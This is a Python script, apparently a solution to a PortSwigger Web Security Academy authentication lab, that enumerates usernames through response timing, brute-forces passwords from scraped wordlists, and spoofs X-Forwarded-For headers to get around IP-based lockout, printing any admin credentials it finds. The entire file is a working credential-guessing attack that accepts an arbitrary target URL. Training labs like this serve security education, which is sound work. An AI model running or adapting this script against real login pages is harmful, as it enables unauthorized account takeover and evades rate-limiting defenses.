import requests
import sys
import urllib3
from bs4 import BeautifulSoup
import random
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

proxy = {'http':'http://127.0.0.1:8080', 'https': 'http://127.0.0.1:8080'}

def scrap_username():
    url = "https://portswigger.net/web-security/authentication/auth-lab-usernames"
    r = requests.get(url, verify=False, proxies=proxy)
    res = r.text
    soup = BeautifulSoup(res, 'html.parser')
    for word in soup.code.contents:
        word = word.split('\n')
        username_list = word
    print(username_list)
    return username_list

def scrap_password():
    url = 'https://portswigger.net/web-security/authentication/auth-lab-passwords'
    r = requests.get(url, verify=False, proxies=proxy)
    res = r.text
    soup = BeautifulSoup (res, 'html.parser')
    for word in soup.code.contents:
        word = word.split('\n')
        password_list = word
    return password_list


def enum_username(url):
    username_list= scrap_username()
    print("[+] Looking for valid username")
    j = 2
    lst = list()
    for i in username_list:
        creds = {
        'username': i,
        'password': 'lolsdfsdfsefsdfsdfsdfsdfsdfsdfsderersdfsfsdfsdfsfghfghfghfghfghfghfg///////FGHGHFGHFHTYtyftydfesdfsdfezrzerzerzer zerzerzerzerdfs sdf sdfsdfsdf sdfsdfsdfsdfdfs'
        }
        header = { 'X-Forwarded-For': '127.2.1.%s' % j}
        j +=1
        r = requests.post(url, verify= False, proxies=proxy, data=creds, headers=header )
        res = r.text
        t = r.elapsed.total_seconds()
        print(i,t)
        lst.append((t, i))
        lst.sort(reverse=True)
    time, username = lst[0]
    print("[+] Username found: %s" % username)
    return username

def admin_cred(url):
    username = enum_username(url)
    password_list = scrap_password()
    for z in password_list:
        j = random.randint(0,255)
        a = random.randint(0,255)
        b = random.randint(0,255)
        c = random.randint(0,255)
        creds = {
        'username': username,
        'password': z
        }
        header = { 'X-Forwarded-For': '%s.%s.%s.%s' %(j,a,b,c)}

        r = requests.post(url, verify= False, proxies=proxy, data=creds, headers=header )
        res = r.text
        print(username, z)
        if "Invalid username or password." not in res:
            print("[+] Password found : %s" % z)
            print("[+] Admin creds are : %s , %s" % (username, z))
            break


def main():
    if len(sys.argv) != 2:
        print("[+] Usage: %s <url> " % sys.argv[0])
        print("[+] Example: %s www.example.com " % sys.argv[0])
        sys.exit(-1)
    url = sys.argv[1].strip()
    print("[+] Brute forcing the shit out of the website...")
    admin_cred(url)


if __name__=="__main__":
    main()